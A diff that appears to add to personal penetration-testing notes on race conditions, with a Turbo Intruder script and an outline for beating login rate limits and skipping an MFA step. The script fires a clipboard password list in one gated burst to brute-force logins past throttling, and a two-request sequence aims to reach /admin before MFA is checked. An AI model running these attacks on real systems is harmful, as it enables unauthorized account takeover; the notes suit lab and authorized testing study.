@@ -24,3 +24,34 @@ def queueRequests(target, wordlists):
     # send all requests in gate '1' in parallel
     engine.openGate('1')
 ```
+
+## Bypassing bruteforce rate limit
+When we are sending invalid credentials sequently, we can have problem with rate limit (captcha solving or blocking of login attempts).  
+We can solve this with race condition and Turbo Intruder, sending many passwords at one time.  
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    passwords = wordlists.clipboard
+    
+    for password in passwords:
+        engine.queue(target.req, password, gate='race1')
+
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+```
+Here we are using password list from our clipboard.  
+
+## Bypassing multi-step sequences
+With race conditions we could be possibly able to bypass some mechanisms such as MFA, sending request to sensitive data BEFORE MFA is generated and checked.
+```
+POST /login
+GET /admin
+```
+If we will send this requests quick enough, we could be potentially able to bypass MFA check which must arise right after login request.  
